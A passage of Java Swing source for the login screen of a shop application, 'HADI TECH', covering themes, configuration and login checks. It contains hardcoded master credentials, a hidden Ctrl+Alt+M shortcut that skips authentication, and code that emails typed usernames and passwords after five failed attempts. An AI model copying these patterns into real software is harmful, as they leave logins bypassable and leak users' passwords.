package haditech;

import java.awt.BasicStroke;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Cursor;
import java.awt.Desktop;
import java.awt.Dialog;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Toolkit;
import java.awt.Window;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.awt.event.InputEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.geom.RoundRectangle2D;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.URI;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.chrono.HijrahDate;
import java.time.format.DateTimeFormatter;
import java.time.temporal.ChronoField;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Locale;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Properties;
import java.util.Set;
import java.util.function.Supplier;
import java.util.regex.Pattern;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.swing.AbstractAction;
import javax.swing.ActionMap;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.InputMap;
import javax.swing.InputVerifier;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JLayeredPane;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.KeyStroke;
import javax.swing.SwingUtilities;
import javax.swing.SwingWorker;
import javax.swing.Timer;
import javax.swing.UIDefaults;
import javax.swing.UIManager;
import javax.swing.border.Border;
import javax.swing.border.LineBorder;
import javax.swing.plaf.ColorUIResource;

import org.json.JSONArray;
import org.json.JSONObject;

import com.formdev.flatlaf.FlatDarkLaf;
import com.formdev.flatlaf.FlatIntelliJLaf;
import com.formdev.flatlaf.intellijthemes.FlatCarbonIJTheme;
import com.formdev.flatlaf.intellijthemes.FlatCobalt2IJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatAtomOneDarkIJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatAtomOneLightIJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatMaterialDarkerIJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatMaterialDeepOceanIJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatMaterialLighterIJTheme;
import com.formdev.flatlaf.intellijthemes.materialthemeuilite.FlatNightOwlIJTheme;
import com.formdev.flatlaf.themes.FlatMacDarkLaf;
import com.formdev.flatlaf.themes.FlatMacLightLaf;

import haditech.Holiday.HolidayType;
import jakarta.mail.Authenticator;
import jakarta.mail.Message;
import jakarta.mail.PasswordAuthentication;
import jakarta.mail.Session;
import jakarta.mail.Transport;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeMessage;
import mhmdsabdlh.component.RoundButton;
import mhmdsabdlh.component.SnowPanel;
import mhmdsabdlh.component.SnowPanel.Shape;
import mhmdsabdlh.component.OverlayPanel.OverlayFrame;
import mhmdsabdlh.component.OverlayPanel.OverlayPanel;
import mhmdsabdlh.dialog.ModernDialog;
import mhmdsabdlh.dialog.ModernDialog.IconType;
import mhmdsabdlh.dialog.UpdateDialog;
import mhmdsabdlh.images.ImageEffect;
import mhmdsabdlh.images.ImageEffect.Position;
import mhmdsabdlh.text.AutoComplete;
import mhmdsabdlh.text.Encryption;
import mhmdsabdlh.text.TextEffect;
import raven.component.PasswordStrengthStatus;
import raven.fancyicon.FancyIcon;
import raven.liquid.LiquidProgress;
import raven.message.SocialMedia;
import raven.message.SocialMedia.APP;
import raven.modal.Toast;
import raven.modal.toast.option.ToastDirection;
import raven.modal.toast.option.ToastLocation;
import raven.modal.toast.option.ToastOption;
import raven.modal.toast.option.ToastStyle;
import raven.modal.toast.option.ToastStyle.BackgroundType;
import raven.textfield.PasswordField;
import raven.textfield.TextField;

public class Intro extends JFrame {
	private final String appVersion = "1.4";
	private int showStatus = 0;
	static Font myFont = new Font("Tahoma", Font.BOLD, 21);
	static Font myFontS = new Font("Tahoma", Font.BOLD, 17);
	static Font myFontXS = new Font("Tahoma", Font.ITALIC, 15);
	// Colores
	static final Color redC = new Color(0xe57373);
	static final Color redD = new Color(161, 48, 48);
	static final Color greenD = new Color(56, 161, 48);
	static final Color greenC = new Color(0xaed581);
	static final Color grisD = new Color(212, 212, 212);
	static final Color blueD = new Color(48, 107, 161);
	static final Color blueC = new Color(0x64b5f6);
	static final Color blackM = new Color(0x121212);
	static final Color blueM = new Color(0x091727);
	static final Color redM = new Color(0x781f19);
	static final Color greenM = new Color(0x09443c);
	static final Color lightC = new Color(0xececec);
	static final Color goldM = new Color(0xa4973f);
	private Color fg, bg;
	static final Border borderD = BorderFactory.createCompoundBorder(new LineBorder(blackM, 1),
			BorderFactory.createEmptyBorder(2, 2, 2, 2));
	static final Border borderL = BorderFactory.createCompoundBorder(new LineBorder(lightC, 1),
			BorderFactory.createEmptyBorder(2, 2, 2, 2));
	private URL enter = getClass().getResource("images/enter.png");
	private ImageIcon enterI = new ImageIcon(enter);
	private URL eyeOpen = getClass().getResource("images/eyeopen.png");
	private ImageIcon eyeOpenI = new ImageIcon(eyeOpen);
	private URL eyeClosed = getClass().getResource("images/eyeclosed.png");
	private ImageIcon eyeClosedI = new ImageIcon(eyeClosed);
	private URL icon = getClass().getResource("images/icon/icon.png");
	private ImageIcon iconI = new ImageIcon(icon);
	private URL setting = getClass().getResource("images/setting.png");
	private ImageIcon settingI = new ImageIcon(setting);
	private URL contactP = getClass().getResource("images/contactus.png");
	private ImageIcon contactI = new ImageIcon(contactP);
	private URL contactMeP = getClass().getResource("images/contactme.png");
	private ImageIcon contactMeI = new ImageIcon(contactMeP);
	private URL confP = getClass().getResource("images/menubar/setting.png");
	private ImageIcon confI = new ImageIcon(confP);
	private URL creator = getClass().getResource("images/menubar/creator.png");
	private ImageIcon creatorI = new ImageIcon(creator);
	private URL about = getClass().getResource("images/menubar/about.png");
	private ImageIcon aboutI = new ImageIcon(about);
	private URL exit = getClass().getResource("images/menubar/exit.png");
	private ImageIcon exitI = new ImageIcon(exit);
	private URL updateP = getClass().getResource("images/menubar/update.png");
	private ImageIcon updateI = new ImageIcon(updateP);
	private URL downgradeP = getClass().getResource("images/menubar/downgrade.png");
	private ImageIcon downgradeI = new ImageIcon(downgradeP);
	private URL changelogP = getClass().getResource("images/menubar/changelog.png");
	private ImageIcon changelogI = new ImageIcon(changelogP);

	static HijrahDate hijrihtDate = HijrahDate.now();
	static String dayN = new SimpleDateFormat("dd").format(Calendar.getInstance().getTime());
	static String monthN = new SimpleDateFormat("M").format(Calendar.getInstance().getTime());
	private int wrongCount = 0;
	private LiquidProgress liquidProgress = new LiquidProgress();

	// sound effects
	private URL enterSound = getClass().getResource("sound/enter.wav");
	private URL notSound = getClass().getResource("sound/notification.wav");
	private URL wrongSound = getClass().getResource("sound/wrong.wav");
	private URL clearSound = getClass().getResource("sound/clear.wav");
	private static Language language;
	private static JLabel loadingLabel;

	private JButton settingL = new JButton();
	private JButton contactUs = new JButton();
	private JButton contactMe = new JButton();
	private JLabel inputText = new JLabel();
	private JLabel userText = new JLabel();
	private JLabel warningLabel = new JLabel("<html></html>", JLabel.CENTER);
	private PasswordField passTF = new PasswordField();
	private TextField usarioName = new TextField();
	private JButton showHide = new JButton();
	private JLabel descTienda = new JLabel();
	private JButton login = new JButton();
	private JButton register = new JButton();
	private JButton updateBtn = new JButton();
	static FancyIcon icon1 = new FancyIcon();
	private JButton linkDownload = new JButton();
	private ArrayList<String> versionAvailable = new ArrayList<String>();
	private ArrayList<Holiday> birthdayL = new ArrayList<Holiday>();
	private ImageIcon updateWithText, regIcon;
	private final SnowPanel snowPanel;
	private int toastTime = 3;

	private String currentpath = System.getProperty("user.dir");
	private File dataFolder = new File(currentpath + "\\data");
	private File confFile = new File(dataFolder, "conf.dll");
	private String conf[] = new String[27];
	static ToastOption notOption = Toast.createOption();

	enum Language {
		SPANISH, PORTUGUES, ENGLISH, FRENCH
	}

	public static void main(String[] args) {
		try {
			UIManager.setLookAndFeel(new FlatIntelliJLaf());
		} catch (Exception e) {
		}
		new Intro();
	}

	Intro() {
		// Dimension
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		int taskbarHeight = Toolkit.getDefaultToolkit().getScreenInsets(getGraphicsConfiguration()).bottom;
		int width = (int) screenSize.getWidth();
		int height = (int) screenSize.getHeight() - taskbarHeight;

		// Frame setting
		setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
		setSize(width, height);
		setLocationRelativeTo(null);
		setMinimumSize(new Dimension(width, height));
		setLayout(null);

		/* CONFIGURATION OPEN */
		dataFolder.mkdir();
		BufferedReader dataOpened = null;
		String line = "";
		int z = 0;
		/* put region language as default */
		language = System.getProperty("user.language").equals("es") ? Language.SPANISH
				: System.getProperty("user.language").equals("pt") ? Language.PORTUGUES
						: System.getProperty("user.language").equals("en") ? Language.ENGLISH : Language.FRENCH;
		/* Open the conf */
		try {
			dataOpened = new BufferedReader(new FileReader(confFile));
			while ((line = dataOpened.readLine()) != null) {
				conf[z] = line.toString();
				z++;
			}
			dataOpened.close();
		} catch (Exception e) {
			// Check if a conf file exist
			if (conf[0] == null || !confFile.exists()) {
				try {
					FileWriter savedF = new FileWriter(confFile);
					savedF.write(0 + System.lineSeparator());// icon
					savedF.write("false" + System.lineSeparator());/// sound effect
					savedF.write("false" + System.lineSeparator());// key shortcut
					savedF.write(10 + System.lineSeparator());// anim
					savedF.write("false" + System.lineSeparator());// auto save
					savedF.write(0 + System.lineSeparator());// first frame
					savedF.write(1 + System.lineSeparator());// speed
					savedF.write((language == Language.SPANISH ? "0"
							: language == Language.PORTUGUES ? "1" : language == Language.ENGLISH ? "2" : "3")
							+ System.lineSeparator());// lang
					savedF.write(0 + System.lineSeparator());// effect chooser
					savedF.write("true" + System.lineSeparator());// intro
					savedF.write("0" + System.lineSeparator());// theme
					savedF.write("1" + System.lineSeparator());// animation
					savedF.write("true" + System.lineSeparator());// always on top
					savedF.write("false" + System.lineSeparator());// auto update
					savedF.write("0" + System.lineSeparator());// WINDOW STYLE
					savedF.write("false" + System.lineSeparator());// dock
					savedF.write("false" + System.lineSeparator());// date
					savedF.write("false" + System.lineSeparator());// not
					savedF.write("false" + System.lineSeparator());// autoclean
					savedF.write("false" + System.lineSeparator());// addo stock
					savedF.write("false" + System.lineSeparator());// eve
					savedF.write("false" + System.lineSeparator());// save stk
					savedF.write("0" + System.lineSeparator());// sort
					savedF.write("false" + System.lineSeparator());// SHOẆLIC
					savedF.write("0" + System.lineSeparator());// not pos
					savedF.write(3 + System.lineSeparator()); // not timer
					savedF.write("false" + System.lineSeparator());// not bg
					savedF.close();
				} catch (Exception e1) {
					writeError(e1);
				}
				conf[0] = "0";
				conf[1] = "false";
				conf[2] = "false";
				conf[3] = "10";
				conf[4] = "false";
				conf[5] = "0";
				conf[6] = "1";
				conf[7] = language == Language.SPANISH ? "0"
						: language == Language.PORTUGUES ? "1" : language == Language.ENGLISH ? "2" : "3";
				conf[8] = "0";
				conf[9] = "true";
				conf[10] = "0";
				conf[11] = "0";
				conf[12] = "true";
				conf[13] = "false";
				conf[14] = "0";
				conf[15] = "false";
				conf[16] = "false";
				conf[17] = "false";
				conf[18] = "false";
				conf[19] = "false";
				conf[20] = "false";
				conf[21] = "false";
				conf[22] = "0";
				conf[23] = "false";
				conf[24] = "0";
				conf[25] = "3";
				conf[26] = "false";
			}
		}
		/* Check if the conf has wrong values */
		confNull();

		/* LANGUAGE */
		if (conf[7].equals("0"))
			language = Language.SPANISH;
		else if (conf[7].equals("1"))
			language = Language.PORTUGUES;
		else if (conf[7].equals("2"))
			language = Language.ENGLISH;
		else
			language = Language.FRENCH;

		/* Always On Top */
		if (conf[12] == null || conf[12].equalsIgnoreCase("null") || conf[12].equals("false"))
			setAlwaysOnTop(true);
		else
			setAlwaysOnTop(false);
		/* CONFIGURATION CLOSE */

		/* THEME ENTER */
		try {
			if (conf[10] == null || conf[10].equalsIgnoreCase("0") || conf[10].equalsIgnoreCase("null")) {
				getContentPane().setBackground(blackM);
				fg = lightC;
				bg = blackM;
				switch (conf[14]) {
				case "0":
					UIManager.setLookAndFeel(new FlatDarkLaf());
					break;
				case "1":
					UIManager.setLookAndFeel(new FlatMacDarkLaf());
					break;
				case "2":
					UIManager.setLookAndFeel(new FlatAtomOneDarkIJTheme());
					break;
				case "3":
					UIManager.setLookAndFeel(new FlatMaterialDarkerIJTheme());
					break;
				default:
					UIManager.setLookAndFeel(new FlatDarkLaf());
					break;
				}
			} else if (conf[10].equalsIgnoreCase("1")) {
				getContentPane().setBackground(blueM);
				fg = lightC;
				bg = blueM;
				switch (conf[14]) {
				case "0":
					UIManager.setLookAndFeel(new FlatCarbonIJTheme());
					break;
				case "1":
					UIManager.setLookAndFeel(new FlatCobalt2IJTheme());
					break;
				case "2":
					UIManager.setLookAndFeel(new FlatNightOwlIJTheme());
					break;
				case "3":
					UIManager.setLookAndFeel(new FlatMaterialDeepOceanIJTheme());
					break;
				default:
					UIManager.setLookAndFeel(new FlatCarbonIJTheme());
					break;
				}
			} else {
				getContentPane().setBackground(lightC);
				bg = lightC;
				fg = blackM;
				switch (conf[14]) {
				case "0":
					UIManager.setLookAndFeel(new FlatIntelliJLaf());
					break;
				case "1":
					UIManager.setLookAndFeel(new FlatMacLightLaf());
					break;
				case "2":
					UIManager.setLookAndFeel(new FlatAtomOneLightIJTheme());
					break;
				case "3":
					UIManager.setLookAndFeel(new FlatMaterialLighterIJTheme());
					break;
				default:
					UIManager.setLookAndFeel(new FlatIntelliJLaf());
					break;
				}
			}
			SwingUtilities.updateComponentTreeUI(this);
		} catch (Exception e) {
			writeError(e);
		} // Add the SnowPanel to the main frame
		setIconImage(new ImageIcon(getClass().getResource("images/icon/icon.png")).getImage());
		snowPanel = new SnowPanel();
		snowPanel.setBounds(0, 0, width, height);

		add(snowPanel);

		/* TOOLTIP SETTING */
		UIManager.put("ToolTip.background", bg);
		UIManager.put("ToolTip.foreground", fg);
		UIManager.put("ToolTip.font", new Font("Comic Sans MS", Font.CENTER_BASELINE, 15));
		UIManager.put("ToolTip.border", new LineBorder(fg, 1));

		/* Notification */
		if (conf[25] == null || !TextEffect.isInteger(conf[25])) {
			toastTime = 3 * 1000;
		} else {
			if (Integer.valueOf(conf[25]) < 1)
				toastTime = 1 * 1000;
			else if (Integer.valueOf(conf[25]) > 60)
				toastTime = 60 * 1000;
			else
				toastTime = Integer.valueOf(conf[25]) * 1000;
		}
		int gradient = 0;
		if (conf[26] == null || conf[26].equalsIgnoreCase("false") || conf[26].equalsIgnoreCase("null"))
			gradient = 0;
		else
			gradient = 1;
		notOption.setAnimationEnabled(true).setPauseDelayOnHover(true).setAutoClose(true).setCloseOnClick(true)
				.setDelay(toastTime).getStyle()
				.setBackgroundType(gradient == 0 ? BackgroundType.GRADIENT : ToastStyle.BackgroundType.DEFAULT)
				.setBorderType(ToastStyle.BorderType.LEADING_LINE).setShowLabel(false).setIconSeparateLine(false)
				.setShowCloseButton(true);
		if (conf[24] == null || conf[24].equalsIgnoreCase("0") || conf[24].equalsIgnoreCase("null"))
			notOption.getLayoutOption().setLocation(0f, taskbarHeight).setDirection(ToastDirection.TOP_TO_BOTTOM);
		else if (conf[24].equalsIgnoreCase("1"))
			notOption.getLayoutOption().setLocation(0.5f, taskbarHeight).setDirection(ToastDirection.TOP_TO_BOTTOM);
		else if (conf[24].equalsIgnoreCase("2"))
			notOption.getLayoutOption().setLocation(1f, taskbarHeight).setDirection(ToastDirection.TOP_TO_BOTTOM);
		else if (conf[24].equalsIgnoreCase("3"))
			notOption.getLayoutOption().setLocation(0.5f, 0.5f).setDirection(ToastDirection.TOP_TO_BOTTOM);
		else if (conf[24].equalsIgnoreCase("4"))
			notOption.getLayoutOption().setLocation(ToastLocation.BOTTOM_LEADING)
					.setDirection(ToastDirection.TOP_TO_BOTTOM);
		else if (conf[24].equalsIgnoreCase("5"))
			notOption.getLayoutOption().setLocation(ToastLocation.BOTTOM_CENTER)
					.setDirection(ToastDirection.TOP_TO_BOTTOM);
		else
			notOption.getLayoutOption().setLocation(ToastLocation.BOTTOM_TRAILING)
					.setDirection(ToastDirection.TOP_TO_BOTTOM);
		/* THEME CLOSE */

		// download users
		Map<String, String> usersMap = new HashMap<>();
		Encryption encrypt = new Encryption();
		try {
			URL passURL = new URL(
					"https://raw.githubusercontent.com/MhmdSAbdlh/HadiTech/refs/heads/main/lib/users.dll");
			File hiddenPath = new File(getHiddenPath());

			File usersF = new File(hiddenPath, "users.dll");
			boolean result = saveFileFromWeb(passURL, usersF);
			if (result) {
				try (BufferedReader userOP = new BufferedReader(new FileReader(usersF))) {
					String userL;
					usersMap.clear();
					while ((userL = userOP.readLine()) != null) {
						String decText = encrypt.decrypt(userL);
						String[] row = decText.split(",");

						// Check row length before processing
						if (row.length < 2) {
							System.err.println("Skipping invalid row: " + userL);
							continue;
						}
						usersMap.put(row[0], row[1]);
					}
				} catch (Exception e) {
					writeError(e);
				}
			}
			// Save mac
			URL macsURL = new URL("https://raw.githubusercontent.com/MhmdSAbdlh/HadiTech/refs/heads/main/lib/macs.dll");

			File macsF = new File(hiddenPath, "macs.dll");
			saveFileFromWeb(macsURL, macsF);
		} catch (IOException e) {
		}

		// Logo
		URL url;
		iconI = ImageEffect.getScaledImage(iconI.getImage(), 50, 50);
		if (conf[0] == null || conf[0].equals("0"))
			url = getClass().getResource("images/icon/logo1.png");
		else if (conf[0].equals("1"))
			url = getClass().getResource("images/icon/logo2.png");
		else if (conf[0].equals("2"))
			url = getClass().getResource("images/icon/logo3.png");
		else if (conf[0].equals("3"))
			url = getClass().getResource("images/icon/logo4.png");
		else if (conf[0].equals("4"))
			url = getClass().getResource("images/icon/logo5.png");
		else
			url = getClass().getResource("images/icon/logo6.png");
		setTitle("HADI TECH " + appVersion);

		// Font
		myFont = new Font("Tahoma", Font.BOLD, getWidth() / 76);
		myFontS = new Font("Tahoma", Font.BOLD, getWidth() / 94);
		myFontXS = new Font("Tahoma", Font.ITALIC, getWidth() / 114);

		// Stuff
		ImageIcon photo = new ImageIcon(url);
		// part left
		String intro = "<html><div style=\"font-size: 50; width: 100%; text-align: center;\"><b>"
				+ "HADI TECH<br></div>" + "<div style=\"font-size: 60;\" ><br>FREE SHOP</b></div>"// spanish
		;
		descTienda.setBounds(60, getHeight() / 2 - 145, width / 2, 250);
		descTienda.setText(intro);
		descTienda.setFont(new Font("Montserrat ExtraBold", Font.BOLD, 85));
		descTienda.setForeground(fg);
		add(descTienda);

		contactUs.setBounds(40, getHeight() - 150, 95, 95);
		contactUs.setIcon(ImageEffect.changeOpacity(
				ImageEffect.invertColor(ImageEffect.getScaledImage(contactI.getImage(), 75, 75)).getImage(), 0.5f));
		contactUs.addActionListener(_ -> {
			SocialMedia socialMedia = new SocialMedia(this);
			socialMedia.setTxtColor(Color.black);
			socialMedia.setBGColor(grisD);
			socialMedia.addLinks(APP.FACEBOOK, "https://www.facebook.com/profile.php?id=61574755664555");
			socialMedia.addLinks(APP.INSTAGRAM, "https://www.instagram.com/hadiabdallah33/");
			socialMedia.addLinks(APP.WEBSITE, "https://github.com/MhmdSAbdlh/HadiTech");
			socialMedia.addLinks(APP.WHATSAPP, "https://wa.me/96171228724");
			socialMedia.showMessage(getLocalizedMessage("CREDIT"));
		});

		contactUs.setToolTipText(getLocalizedMessage("CONTACTUS"));
		opacityEffect(contactUs, () -> ImageEffect.invertColor(ImageEffect.getScaledImage(contactI.getImage(), 75, 75)),
				conf[10]);
		add(contactUs);

		contactMe.setBounds(155, getHeight() - 150, 95, 95);
		contactMe.setIcon(ImageEffect.changeOpacity(
				ImageEffect.invertColor(ImageEffect.getScaledImage(contactMeI.getImage(), 75, 75)).getImage(), 0.5f));
		opacityEffect(contactMe,
				() -> ImageEffect.invertColor(ImageEffect.getScaledImage(contactMeI.getImage(), 75, 75)), conf[10]);
		contactMe.addActionListener(_ -> {
			SocialMedia socialMedia = new SocialMedia(this);
			socialMedia.setLinks("https://www.youtube.com/channel/UCzuTm6D0YasEDrVtIlvwjag", "",
					"https://www.facebook.com/mhmdsabdlh", "https://mhmdsabdlh.github.io/",
					"https://www.instagram.com/mhmdsabdlh/", "https://twitter.com/MhmdSAbdlh/",
					"https://www.paypal.com/paypalme/mhmdsabdlh");
			socialMedia.setTxtColor(Color.black);
			socialMedia.setBGColor(grisD);
			socialMedia.showMessage(getLocalizedMessage("ABOUT"));
		});
		contactMe.setToolTipText(getLocalizedMessage("CONTACTME"));
		add(contactMe);

		// part right
		settingL.setBounds(width - 125, 20, 90, 90);
		settingL.setIcon(ImageEffect.changeOpacity(
				ImageEffect.invertColor(ImageEffect.getScaledImage(settingI.getImage(), 75, 75)).getImage(), 0.5f));
		opacityEffect(settingL, () -> ImageEffect.invertColor(ImageEffect.getScaledImage(settingI.getImage(), 75, 75)),
				conf[10]);
		settingL.setToolTipText(getLocalizedMessage("CONF"));
		settingL.addActionListener(_ -> new SettingsDialog(this, "first"));

		// Add focus listener to highlight fields on focus
		Color highlightColor = new Color(0x888888);
		FocusAdapter highlightFocusListener = new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent e) {
				JComponent source = (JComponent) e.getSource();
				source.setBackground(highlightColor);
			}

			@Override
			public void focusLost(FocusEvent e) {
				JComponent source = (JComponent) e.getSource();
				source.setBackground(fg);
			}
		};
		userText.setText(getLocalizedMessage("USER"));
		userText.setBounds(getWidth() / 2, 27 * height / 100, getWidth() / 2, 40);
		userText.setHorizontalAlignment(0);
		userText.setFont(new Font("Open Sans SemiBold Italic", Font.BOLD, 20));
		userText.setForeground(fg);
		add(userText);
		usarioName.setBounds(getWidth() * 3 / 4 - 100, userText.getY() + userText.getHeight() + 10, 200, 50);
		usarioName.setHorizontalAlignment(0);
		usarioName.setText("");
		usarioName.setShadowColor(fg);
		usarioName.setBackground(fg);
		usarioName.setForeground(bg);
		usarioName.setCaretColor(bg);
		// Add the listener to each field
		usarioName.addFocusListener(highlightFocusListener);
		passTF.addFocusListener(highlightFocusListener);
		ArrayList<String> users = new ArrayList<>();
		users.add("mhmdsabdlh");
		for (Entry<String, String> entry : usersMap.entrySet()) {
			users.add(entry.getKey());
		}
		AutoComplete userAC = new AutoComplete(usarioName, users);
		usarioName.getDocument().addDocumentListener(userAC);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowOpened(WindowEvent e) {
				usarioName.requestFocus();
			}
		});
		usarioName.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent e) {
				if ((e.getKeyCode() == KeyEvent.VK_M) && ((e.getModifiers() & InputEvent.CTRL_MASK) != 0)
						&& ((e.getModifiers() & InputEvent.ALT_MASK) != 0)) {
					dispose();
					new Main();
				} else if ((e.getKeyCode() == KeyEvent.VK_H) && ((e.getModifiers() & InputEvent.CTRL_MASK) != 0)
						&& ((e.getModifiers() & InputEvent.ALT_MASK) != 0)) {
					Component[] components = getContentPane().getComponents();
					for (Component component : components) {
						if (component instanceof JComponent) {
							((JComponent) component).setVisible(false);
						}
					}
					icon1.setVisible(true);
				}
			}
		});
		add(usarioName);

		inputText.setText(getLocalizedMessage("PASSWORD"));
		inputText.setBounds(getWidth() / 2, usarioName.getHeight() + usarioName.getY() + 80, getWidth() / 2, 40);
		inputText.setHorizontalAlignment(0);
		inputText.setFont(new Font("Open Sans SemiBold Italic", Font.BOLD, 20));
		inputText.setForeground(fg);
		passTF.setBounds(3 * getWidth() / 4 - 150, inputText.getY() + inputText.getHeight() + 10, 300, 50);
		passTF.setHorizontalAlignment(0);
		passTF.setCaretColor(bg);
		passTF.setForeground(bg);
		passTF.setShadowColor(fg);
		passTF.setBackground(fg);

		regIcon = ImageEffect.invertColor(ImageEffect.createIconWithText(
				ImageEffect.getScaledImage(
						new ImageIcon(getClass().getResource("images/menubar/signup.png")).getImage(), 30, 30),
				getLocalizedMessage("REGISTER"), myFont, blackM, Position.RIGHT));
		register = new JButton(ImageEffect.changeOpacity(regIcon.getImage(), 0.5f));
		register.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				applyFadeEffect(register, regIcon, 0.5f, 1.0f, 5);
			}

			@Override
			public void mouseExited(MouseEvent e) {
				applyFadeEffect(register, regIcon, 1.0f, 0.5f, 5);
			}
		});
		register.setBounds(passTF.getX(), passTF.getY() + passTF.getHeight() + 20, 300, 40);
		register.setHorizontalAlignment(0);
		register.setFont(new Font("Impact", Font.ITALIC, 20));
		register.setOpaque(false);
		register.setContentAreaFilled(false);
		register.setBorderPainted(true);
		register.setFocusPainted(false);
		register.addActionListener(_ -> registerDialog());

		showHide.setToolTipText(getLocalizedMessage("SHOW") + "/" + getLocalizedMessage("HIDE"));
		showHide.setContentAreaFilled(false);
		showHide.setBorderPainted(false);
		showHide.setBounds(passTF.getX() + passTF.getWidth() - 55, passTF.getY(), 45, 45);
		showHide.setIcon(ImageEffect.getScaledImage(eyeClosedI.getImage(), 45, 45));
		btnStyle(showHide);
		showHide.addActionListener(_ -> {
			if (showStatus == 0) {
				passTF.setEchoChar((char) 0);
				showStatus = 1;
				if (conf[10].equalsIgnoreCase("2"))
					showHide.setIcon(
							ImageEffect.invertColor((ImageEffect.getScaledImage(eyeOpenI.getImage(), 45, 45))));
				else
					showHide.setIcon(ImageEffect.getScaledImage(eyeOpenI.getImage(), 45, 45));
			} else {
				passTF.setEchoChar('•');
				showStatus = 0;
				if (conf[10].equalsIgnoreCase("2"))
					showHide.setIcon(
							ImageEffect.invertColor((ImageEffect.getScaledImage(eyeClosedI.getImage(), 45, 45))));
				else
					showHide.setIcon(ImageEffect.getScaledImage(eyeClosedI.getImage(), 45, 45));
			}
		});

		// cierre de caja
		login.setIcon(ImageEffect.changeOpacity(
				ImageEffect.invertColor(ImageEffect.getScaledImage(enterI.getImage(), 100, 100)).getImage(), 0.5f));
		login.setBounds(passTF.getX() + passTF.getWidth() / 2 - 50, height * 6 / 8, 100, 100);
		opacityEffect(login, () -> ImageEffect.invertColor(ImageEffect.getScaledImage(enterI.getImage(), 100, 100)),
				conf[10]);
		login.setToolTipText(getLocalizedMessage("LOGIN"));
		users.add("H@DI1998".toLowerCase());
		login.addActionListener(_ -> {
			boolean cond1 = usarioName.getText().equalsIgnoreCase("H@DI1998");
			boolean cond2 = false;
			for (String currentUser : users)
				if (String.valueOf(passTF.getPassword()).equalsIgnoreCase(usersMap.get(currentUser)))
					cond2 = true;
			boolean cedrosUser = (String.valueOf(passTF.getPassword()).equals("Arsen@l1998"));
			if (!users.contains(usarioName.getText().toLowerCase())) {
				startBorderAnimation(usarioName);
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("USER_NOFOUND"), notOption);
				wrongCount++;
				if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
					soundEffect(wrongSound);
			} else if ((cond1 && cedrosUser) || cond2) {
				if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
					soundEffect(enterSound);
				passTF.setText("");
				dispose();
				new Main();
			} else {
				if (String.valueOf(passTF.getPassword()).equalsIgnoreCase("")) {
					startBorderAnimation(passTF);
					Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("EMPTY_PASSWORD"), notOption);
					if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
						soundEffect(wrongSound);
					wrongCount++;
				} else {
					startBorderAnimation(passTF);
					wrongCount++;
					Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("WRONG_PASSWORD"), notOption);
					if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
						soundEffect(wrongSound);
				}
				passTF.selectAll();
			}
			if (wrongCount >= 5) {
				Component[] components = getContentPane().getComponents();
				for (Component component : components) {
					if (component instanceof JComponent) {
						((JComponent) component).setVisible(false);
					}
				}
				icon1.setVisible(true);
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("TOO_WRONG"), notOption);
				sendEmail("hamadakakos@gmail.com", usarioName.getText(), String.valueOf(passTF.getPassword()), "");
			}
		});

		/* part center */
		icon1.start();
		icon1.setBounds(getWidth() / 2 - height / 6, (getHeight() - height / 3) / 2, height / 3, height / 3);
		icon1.setImage(photo);
		add(icon1);
		linkDownload.setText(getLocalizedMessage("DOWNLOAD_BROWSER"));
		linkDownload.setBounds(getWidth() / 2 - 250, getHeight() - 150, 500, 50);
		linkDownload.setHorizontalAlignment(0);
		linkDownload.setFont(new Font("Impact", Font.ITALIC, 20));
		linkDownload.setForeground(fg);
